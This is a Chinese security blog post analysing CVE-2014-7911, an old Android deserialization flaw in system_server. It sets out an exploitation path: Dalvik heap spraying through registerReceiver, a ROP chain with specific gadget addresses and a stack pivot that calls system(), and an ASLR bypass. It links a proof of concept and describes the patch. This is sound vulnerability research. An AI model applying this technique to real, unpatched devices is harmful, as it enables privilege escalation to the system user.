<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(*(*(mOrgue+4))&#x3D;&#x3D;1)&#123;</span><br><span class="line">    refs &#x3D; *(mOrgue+4)</span><br><span class="line">    r2 &#x3D; *(*(*(refs+8))+12)</span><br><span class="line">    blx r2  -----&gt;获取控制权</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>除此以外，攻击者还必须克服Android中的漏洞缓解技术——ASLR和DEP。</p>
<h3 id="0x03漏洞利用"><a href="#0x03漏洞利用" class="headerlink" title="0x03漏洞利用"></a>0x03漏洞利用</h3><p>为了成功获得任意代码执行，攻击者可以使用堆喷射、堆栈转移（stack pivoting）和ROP等技术。受限于笔者目前水平，这里就不再分析了，具体分析和retme大牛的POC可参见[2,3,4]。</p>
<p>值得注意的是，尽管Android采用了ASLR机制，但为了获得正确的地址，可以基于这样一个事实：system_server和攻击者app都是从同一个进程-Zygote fork而来，具有相同的基址，攻击者通过分析自己进程的map文件（位于/proc/&lt;pid&gt;/maps）就可以知道system_server以及所加载模块的内存布局。</p>
<p>另外一个有趣的话题是，洞主Jann Horn对PAN的分析进行了评论[2]，认为不需要复杂的ROP gadgets就可以实现命令执行，而PAN对此进行了澄清。这从侧面反映了漏洞利用技术也是一门大的学问，有时即使漏洞发现者也未必能够真正理解漏洞利用的挑战。</p>
<p>最后Jann Horn谈到了发现此漏洞的灵感[5]，源于他在大学时听到的一次讲座，涉及到某个PHP web应用在反序列化攻击者输入数据时出现的漏洞，这使他思考其他应用是否也有类似的问题。他知道Java的反序列化由ObjectInputStream处理不可信的输入数据，android也许忘了进行检查。是的，漏洞就在那里。</p>
<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p>[1]<a href="http://seclists.org/fulldisclosure/2014/Nov/51" target="_blank" rel="noopener">http://seclists.org/fulldisclosure/2014/Nov/51</a></p>
<p>[2]<a href="http://researchcenter.paloaltonetworks.com/2015/01/cve-2014-7911-deep-dive-analysis-android-system-service-vulnerability-exploitation" target="_blank" rel="noopener">http://researchcenter.paloaltonetworks.com/2015/01/cve-2014-7911-deep-dive-analysis-android-system-service-vulnerability-exploitation</a></p>
<p>[3]<a href="https://github.com/retme7/CVE-2014-7911_poc" target="_blank" rel="noopener">https://github.com/retme7/CVE-2014-7911_poc</a></p>
<p>[4]<a href="https://github.com/retme7/My-Slides/blob/master/xKungfooSH%40retme.pdf" target="_blank" rel="noopener">https://github.com/retme7/My-Slides/blob/master/xKungfooSH%40retme.pdf</a> </p>
<p>[5]<a href="https://www.reddit.com/r/netsec/comments/2mr9cz/cve20147911_android_50_privilege_escalation_using/" target="_blank" rel="noopener">https://www.reddit.com/r/netsec/comments/2mr9cz/cve20147911_android_50_privilege_escalation_using/</a></p>
<p>[6]<a href="http://grepcode.com/file/repository.grepcode.com/java/ext/com.google.android/android/4.4_r1/android/os/IUserManager.java#IUserManager.Stub.Proxy.setApplicationRestrictions%28java.lang.String%2Candroid.os.Bundle%2Cint%29" target="_blank" rel="noopener">http://grepcode.com/file/repository.grepcode.com/java/ext/com.google.android/android/4.4_r1/android/os/IUserManager.java#IUserManager.Stub.Proxy.setApplicationRestrictions%28java.lang.String%2Candroid.os.Bundle%2Cint%29</a></p>
<p>—-2015.10.20更新—–</p>
<h2 id="第二部分-漏洞利用详解"><a href="#第二部分-漏洞利用详解" class="headerlink" title="第二部分 漏洞利用详解"></a>第二部分 漏洞利用详解</h2><h3 id="0x00-回顾"><a href="#0x00-回顾" class="headerlink" title="0x00 回顾"></a>0x00 回顾</h3><p>CVE-2014-7911是一个非常值得学习的漏洞，其漏洞成因和漏洞利用涉及java序列化、安卓binder IPC通信、ROP、Stack Pivot、heap Spray及多方面的知识，<a href="http://drops.wooyun.org/mobile/6082" target="_blank" rel="noopener">http://drops.wooyun.org/mobile/6082</a>对漏洞成因及Crash POC进行了分析。本篇结合retme、secauo等大牛们的已有exp，站在大牛们的肩膀上，续写漏洞利用部分，最终目标是利用这个漏洞以system权限执行代码。</p>
<p>首先回顾一下。前面提到，利用java反射和Binder进程间通信机制，向system_server传入一不可序列化的恶意对象，由于java.io.ObjectInputStream并未校验该输入的对象实例是否是实际可序列化的，因此当该对象实例被ObjectInputStream反序列化时，将发生类型混淆，对象的Field被视为由本地代码处理的指针，使攻击者获得控制权。如下，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(*(*(mOrgue+4))&#x3D;&#x3D;1)&#123;</span><br><span class="line">    refs &#x3D; *(mOrgue+4)</span><br><span class="line">    r2 &#x3D; *(*(*(refs+8))+12)</span><br><span class="line">    blx r2  -----&gt;获取控制权</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中mOrgue是攻击者可控的，经过三重指针的解引用，最终以system_server(uid=1000)的权限跳转到攻击者可控的地址执行代码，从而实现从普通用户到system用户的提权。</p>
<h3 id="0x01-Dalvik-heap-Spray"><a href="#0x01-Dalvik-heap-Spray" class="headerlink" title="0x01 Dalvik-heap Spray"></a>0x01 Dalvik-heap Spray</h3><p>为了使上述blx r2这条指令可靠稳定地跳转到执行攻击者可控的代码，需要使用堆喷射技术，在system_server内存空间的dalvik-heap中预先布置大量的Spray Buffer, 其中放置提权代码以及大量指向该提权代码的地址。这涉及到两个问题。</p>
<ol>
<li>如何向sysetem_server的dalvik-heap空间传入可控字符串？</li>
<li>如何在dalvik-heap中布局这些可控字符串，才能在每次漏洞利用时都稳定执行代码？</li>
</ol>
<p>对于第一个问题，我们知道system_server向android系统提供绝大多数的系统服务，通过这些服务的一些特定方法可以向system_server传入String，同时system_server把这些String存储在Dalvik-heap中，在GC之前都不会销毁。例如，下面android.content.Context中的registerReceiver方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public Intent registerReceiver (BroadcastReceiver receiver, IntentFilter filter, String broadcastPermission, Handler scheduler)</span><br></pre></td></tr></table></figure>
<p>其中broadcastPermission为String类型，调用该方法后，String Buffer将常驻system_server进程空间。具体调用链见</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ContextWrapper.registerReceiver-&gt;ContextImpl.registerReceiver-&gt;ContextImpl.registerReceiverInternal-&gt;ActivityManagerProxy.registerReceiver-&gt;ActivityManagerService.registerReceiver</span><br></pre></td></tr></table></figure>

<p>该调用链表明可从某个app的Context通过binder IPC跨进程调用system_server的ActivityManagerService.registerReceiver方法，注意ActivityManagerService常驻system_server进程空间。我们再看看ActivityManagerService的registerReceiver方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public Intent registerReceiver(IApplicationThread caller, String callerPackage, IIntentReceiver receiver, IntentFilter filter, String permission, int userId) &#123;</span><br><span class="line">enforceNotIsolatedCaller(&quot;registerReceiver&quot;);</span><br><span class="line">	int callingUid;</span><br><span class="line">	int callingPid;</span><br><span class="line">	synchronized(this) &#123;</span><br><span class="line">		......</span><br><span class="line">	    ReceiverList rl</span><br><span class="line">	        &#x3D; (ReceiverList)mRegisteredReceivers.get(receiver.asBinder());</span><br><span class="line">	    ......</span><br><span class="line">	    BroadcastFilter bf &#x3D; new BroadcastFilter(filter, rl, callerPackage,</span><br><span class="line">            permission, callingUid, userId); &#x2F;&#x2F;在Dalvik-heap中分配内存</span><br><span class="line">	    rl.add(bf);</span><br><span class="line">	    ......</span><br><span class="line">	    return sticky;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意上面的new将在system_server进程的Dalvik-heap堆中分配内存，传入的String Buffer即permission将常驻system_server进程空间。这样，第一个问题解决了。</p>
<p>下面探讨第二个问题：如何在dalvik-heap中布局这些可控字符串，才能在每次漏洞利用时都能稳定执行代码？</p>
<p>根据前面的叙述，攻击者可控的mOrgue需要指向一个可读的内存区域，简单地让其指向传入registerReceiver方法permission参数String Buffer所属的地址区域并在String Buffer中布置ROP Gadget即可达到这个目的，但system_server在其dalvik-heap中分配String Buffer的偏移地址却是未知的，mOrgue未必能命中（指向）堆块中为String Buffer分配的内存。为了提高命中率，需要在dalvik-heap中分配大量的String Buffer，这就是Heap Spray(堆喷射)技术，反复调用registerReceiver方法分配大量的String Buffer即可完成Heap Spray。但是，String Buffer的地址在每次调用registerReceiver方法分配内存时都会不一样，这就需要构造一种特殊的堆喷射布局，包含递减的指针值[2]，如图。</p>
<p><img src="/2015/05/25/cve-2014-7911/CVE-2014-7911.png" alt="image"></p>
<p>如图，每一个在堆中分配的内存块(chunk)，都包含Relative Address Chunk和Gadget_buffer两部分，目标是使可控的STATIC_ADDRESS（即mOrgue）位于Relative Address Chunk，并且使其存放的内容[STATIC_ADDRESS]=GADGET_BUFFER（即Gadget_buffer的地址）。简单的思路就是在每个chunk的relative Address Chunk中都放入GADGET_BUFFER，然而由于GADGET_BUFFER在每个chunk中都不一样，而且也无法在跨进程传入system_server之前提前知晓，因此该思路并不可行。</p>
<p>注意，GADGET_BUFFER = 堆底地址 + Gadget_buffer_offset(即Gadget_Buffer相对于堆底的偏移)。当STATIC_ADDRESS=堆底地址时，GADGET_BUFFER = STATIC_ADRRESS+Gadget_buffer_offset；考虑到四字节对齐，一般情况下，STATIC_ADDRESS=堆底地址+4N（N=1,2,…），此时GADGET_BUFFER = STATIC_ADDRESS + Gadget_buffer_offset - 4N。因此，在每一个Chunk的Relative Address Chunk区域按地址增长方向，依次在内存中填入STATIC_ADDRESS+Gadget_buffer_offset、STATIC_ADDRESS+Gadget_buffer_offset-4、…、STATIC_ADDRESS+Gadget_buffer_offset-4N。这样，给定一个STATIC_ADDRESS，只要能落入system_server在dalvik heap分配的Relative Addresses Chunk的地址范围(为了提高这个可能性，需要满足<br> 1.每一个Chunk的Relative Address Chunk比Gadget Buffer大很多；2.分配大量这样的Chunk），就总是存在[STATIC_ADDRESS]=GADGET_BUFFER，并满足[STATIC_ADDRESS+4N]=GADGET_BUFFER-4N（这个条件将在后面布置Gadget时用到）。<br>按照这样的布局，回过来再看汇编代码，布置Gadget_Buffer。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ldr     r4, [r0, #4]   # r0&#x3D;STATIC_ADDRESS--&gt;r4&#x3D;[STATIC_ADDRESS+4]&#x3D;GADGET_BUFFER-4</span><br><span class="line">mov     r6, r1</span><br><span class="line">mov     r0, r4  # r0&#x3D;GADGET_BUFFER-4</span><br><span class="line">blx     &lt;android_atomic_dec ()&gt;</span><br></pre></td></tr></table></figure>

<p>调用android_atomic_dec函数之后</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cmp     r0, #1          # r0 &#x3D; [GADGET_BUFFER-4]</span><br><span class="line">bne.n   d1ea</span><br><span class="line">ldr     r0, [r4, #8]    # r0 &#x3D; [GADGET_BUFFER-4+8] &#x3D; [GADGET_BUFFER+4]</span><br><span class="line">mov     r1, r6</span><br><span class="line">ldr     r3, [r0, #0]    # r3 &#x3D;[[GADGET_BUFFER+4]] &#x3D; [STATIC_ADDRESS+12] &#x3D; GADGET_BUFFER-12</span><br><span class="line">ldr     r2, [r3, #12]   # r2 &#x3D; [GADGET_BUFFER -12 +12] &#x3D; [GADGET_BUFFER]</span><br><span class="line">blx     r2</span><br></pre></td></tr></table></figure>

<p>首先，为了进入blx r2这条分支，r0必须等于1，也就是[GADGET_BUFFER-4]=1；其次，[GADGET_BUFFER+4]必须为一个合法可读的地址，为了方便之后的布局，我们令[GADGET_BUFFER+4]=STATIC_ADDRESS+12，因此r3 = [STATIC_ADDRESS+12]=GADGET_BUFFER-12,接下来r2=[r3+12]=[GADGET_BUFFER-12+12]=[GADGET_BUFFER]，程序将跳转到GADGET_BUFFER这个地址存放的内容执行，因此在这里就可以布置ROP Gadget1的地址了。</p>
<h3 id="0x02-ROP-Chain"><a href="#0x02-ROP-Chain" class="headerlink" title="0x02 ROP Chain"></a>0x02 ROP Chain</h3><p>由于Android使用了DEP，因此Dalvik-heap上的内存不能用来执行，这就必须使用ROP技术，使PC跳转到一系列合法指令序列（Gadget），并由这些Gadget“拼凑”而成shellcode。这里我们将使用ROP Gadget调用system函数执行代码。</p>
<p>使用ROPGadget这个工具，在zygote加载的基础模块（如libc.so、libwebviewchromium.so、libdvm.so）上进行搜索，把arm code当做thumb code来搜索，可以增加更多的候选指令序列。</p>
<p>为了调用system函数，需要控制r0寄存器，指向我们预先布置的命令行字符串作为参数。这里需要使用Stack Pivot技术，将栈顶指针SP指向控制的Dalvik-heap堆中的数据，这将为控制PC寄存器、以及在栈上布置数据带来便利。利用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --thumb --binary libwebviewchromium.so</span><br></pre></td></tr></table></figure>
<p>可找到如下Gadget</p>
<h4 id="Gadget1"><a href="#Gadget1" class="headerlink" title="Gadget1"></a>Gadget1</h4><p>为Stack Pivot作准备</p>
<p>in libwebviewchromium.so</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">70a93c:       682f            ldr     r7, [r5, #0]  #r5&#x3D;STATIC_ADDRESS, r7&#x3D;[STATIC_ADDRESS]&#x3D;GADGET_BUFFER</span><br><span class="line">70a93e:       4628            mov     r0, r5       #r0&#x3D;STATIC_ADDRESS</span><br><span class="line">70a940:       68b9            ldr     r1, [r7, #8] #r1&#x3D;[GADGET_BUFFER+8]</span><br><span class="line">70a942:       4788            blx     r1</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">4fed02:       4628            mov     r0, r5           #r5 &#x3D; STATIC_ADDRESS</span><br><span class="line">4fed04:       682f            ldr     r7, [r5, #0]     #r7 &#x3D; [STATIC_ADDRESS] &#x3D; GADGET_BUFFER</span><br><span class="line">4fed06:       f8d4 8048       ldr.w   r8, [r4, #72]   ; 0x48</span><br><span class="line">4fed0a:       68b9            ldr     r1, [r7, #8]     #r1 &#x3D; [GADGET_BUFFER+8]</span><br><span class="line">4fed0c:       4788            blx     r1</span><br></pre></td></tr></table></figure>

<p>因此，GADGET_BUFFER+8这个地址需要指向第二个Gadget</p>
<h4 id="Gadget2"><a href="#Gadget2" class="headerlink" title="Gadget2"></a>Gadget2</h4><p>Stack Pivot</p>
<p>in libdvm.so</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">664c4:       f107 0708       add.w   r7, r7, #8   #r7&#x3D;r7+8&#x3D;GADGET_BUFFER+8</span><br><span class="line">664c8:       46bd            mov     sp, r7       #sp&#x3D;GADGET_BUFFER+8</span><br><span class="line">664ca:       bdb0            pop     &#123;r4, r5, r7, pc&#125;</span><br><span class="line"># r4&#x3D;[GADGET_BUFFER+8],r5&#x3D;[GADGET_BUFFER+12],r7&#x3D;[GADGET_BUFFER+16],pc&#x3D;[GADGET_BUFFER+20], sp&#x3D;GADGET_BUFFER+24</span><br></pre></td></tr></table></figure>

<p>可以看到，将SP指向堆中可控的数据后，后面就可以控制PC。这里，我们提前将system函数的地址写入[GADGET_BUFFER+12]。为什么要通过Gadget1的过渡才能来到Gadget2，事实上这是不得已而为之，使用ROPGadget搜遍/system/lib下的基础模块grep “mov sp,r”，只发现mov sp,r7，因此只能采取这种过渡的方式。</p>
<p>接下来，在GADGET_BUFFER+20这个地址填入Gadget3的地址</p>
<h4 id="Gadget3"><a href="#Gadget3" class="headerlink" title="Gadget3"></a>Gadget3</h4><p>in libwebviewchromium.so</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">30c4b8:       4668            mov     r0, sp   #r0&#x3D;GADGET_BUFFER+24</span><br><span class="line">30c4ba:       47a8            blx     r5       #r5&#x3D;[GADGET_BUFFER+12]&#x3D;system_addr</span><br></pre></td></tr></table></figure>

<p>因此，提前将system函数的参数放入r0指向的GADGET_BUFFER+24即可，最终将以system_server的权限执行任意代码。</p>
<p>最终的chunk布局如图。</p>
<p><img src="/2015/05/25/cve-2014-7911/Chunk.png" alt="image"></p>
<p>最后，构造ROP Chain还需要考虑一个细节，ARM有两种模式Thumb和ARM模式，我们使用的Gadgets均为Thumb模式，因此其地址的最低位均需要加1。</p>
<h3 id="0x03-ASLR"><a href="#0x03-ASLR" class="headerlink" title="0x03 ASLR"></a>0x03 ASLR</h3><p>Android 自4.1始开始启用ASLR（地址随机化），任何程序自身的的地址空间在每一次运行时都将发生变化。但在Android中，攻击程序、system_server皆由zygote进程fork而来，因此攻击程序与system_server共享同样的基础模块和dalvik-heap。只要在使用dalvik heapspray和构建ROP Gadget时，只使用libc、libdvm这些基础模块，就无需考虑地址随机化的问题。通过对攻击程序自身/proc/&lt;pid&gt;/maps文件的解析，就可以得知所加载基础模块的基址。如图，</p>
<p><img src="/2015/05/25/cve-2014-7911/noaslr.png" alt="image"></p>
<p>根据上述Gadgets构建的POC见<a href="https://github.com/heeeeen/CVE-2014-7911poc" target="_blank" rel="noopener">https://github.com/heeeeen/CVE-2014-7911poc</a><br>，执行完毕后，将以system用户的权限在/data目录下生成一个pwned.txt文件。</p>
<h3 id="0x04-修复"><a href="#0x04-修复" class="headerlink" title="0x04 修复"></a>0x04 修复</h3><p>见<a href="https://android.googlesource.com/platform/libcore/+/738c833d38d41f8f76eb7e77ab39add82b1ae1e2%5E%21/#F0" target="_blank" rel="noopener">https://android.googlesource.com/platform/libcore/+/738c833d38d41f8f76eb7e77ab39add82b1ae1e2%5E%21/#F0</a>，涉及与反序列化相关的<br>ObjectInputStream.java、ObjectStreamClass.java、ObjectStreamConstants.java、SerializationTest.java等文件。主要加了三种检查：</p>
<ol>
<li>检查反序列化的类是否仍然满足序列化的需求；</li>
<li>检查反序列化的类的类型是否与stream中所持有的类型信息 (enum, serializable, externalizable)一致；</li>
<li>在某些情形下，延迟类的静态初始化，直到对序列化流的内容检查完成。</li>
</ol>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>1.<a href="http://researchcenter.paloaltonetworks.com/2015/01/cve-2014-7911-deep-dive-analysis-android-system-service-vulnerability-exploitation" target="_blank" rel="noopener">http://researchcenter.paloaltonetworks.com/2015/01/cve-2014-7911-deep-dive-analysis-android-system-service-vulnerability-exploitation</a></p>
<p>2.<a href="https://github.com/retme7/CVE-2014-7911_poc" target="_blank" rel="noopener">https://github.com/retme7/CVE-2014-7911_poc</a></p>
<p>3.<a href="https://github.com/retme7/My-Slides/blob/master/xKungfooSH%40retme.pdf" target="_blank" rel="noopener">https://github.com/retme7/My-Slides/blob/master/xKungfooSH%40retme.pdf</a> </p>
<p>4.<a href="http://secauo.com/CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability.html" target="_blank" rel="noopener">http://secauo.com/CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability.html</a> </p>
</div><div class="tags"><a href="/tags/Android/"><i class="fa fa-tag"></i>Android</a></div><div class="post-nav"><a class="pre" href="/2015/07/12/android-open-port/">浅谈Android开放网络端口的安全风险</a></div></div></div></div><div class="pure-u-1 pure-u-md-1-4"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="http://yoursite.com"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%B6%E4%BB%96/">其他</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/">社会工程学</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/">移动安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/">逆向分析</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/Android/" style="font-size: 15px;">Android</a> <a href="/tags/Linux/" style="font-size: 15px;">Linux</a> <a href="/tags/%E7%99%BB%E9%99%86%E5%87%AD%E8%AF%81/" style="font-size: 15px;">登陆凭证</a> <a href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" style="font-size: 15px;">内网穿透</a> <a href="/tags/JAVA/" style="font-size: 15px;">JAVA</a> <a href="/tags/PWN/" style="font-size: 15px;">PWN</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/%E5%8E%9F%E5%88%9B%E6%BC%8F%E6%B4%9E/" style="font-size: 15px;">原创漏洞</a> <a href="/tags/CMS/" style="font-size: 15px;">CMS</a> <a href="/tags/Window/" style="font-size: 15px;">Window</a> <a href="/tags/%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6/" style="font-size: 15px;">杀毒软件</a> <a href="/tags/Cknife/" style="font-size: 15px;">Cknife</a> <a href="/tags/%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7/" style="font-size: 15px;">审计工具</a> <a href="/tags/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F/" style="font-size: 15px;">恶意程序</a> <a href="/tags/Github/" style="font-size: 15px;">Github</a> <a href="/tags/IOS/" style="font-size: 15px;">IOS</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/06/17/Collect-login-credentials/">linux后渗透之收集登录凭证</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/17/Intranet-penetration/">内网渗透之内网穿透</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/27/Subrion-Cms-Code-Audit/">Subrion CMS 代码审计</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/19/Java-Debug/">Java无源码调试之英雄崛起</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/27/CVE-2017-8890-smep-bypass/">CVE-2017-8890实现linux内核提权- SMEP绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/27/CVE-2017-8890-kernel-escalation1/">利用CVE-2017-8890实现linux内核提权- ret2usr</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/03/bundle-mismatch/">Bundle风水——Android序列化与反序列化不匹配漏洞详解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/03/qwb2-silent-writeup/">强网杯silent分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/23/Rootme-uaf-writeup/">Rootme CTF UAF Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/22/android-blueborne2/">Android蓝牙远程命令执行漏洞利用实践 exploit优化</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://www.zerokeeper.com/" title="小李飞刀" target="_blank">小李飞刀</a><ul></ul><a href="http://cybersec.blog.51cto.com" title="网络空间安全的道与术" target="_blank">网络空间安全的道与术</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2020 <a href="/." rel="nofollow">MS509 Team.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.css"><script type="text/javascript" src="/js/copycode.js" successtext="复制成功!"></script><link rel="stylesheet" type="text/css" href="/css/copycode.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>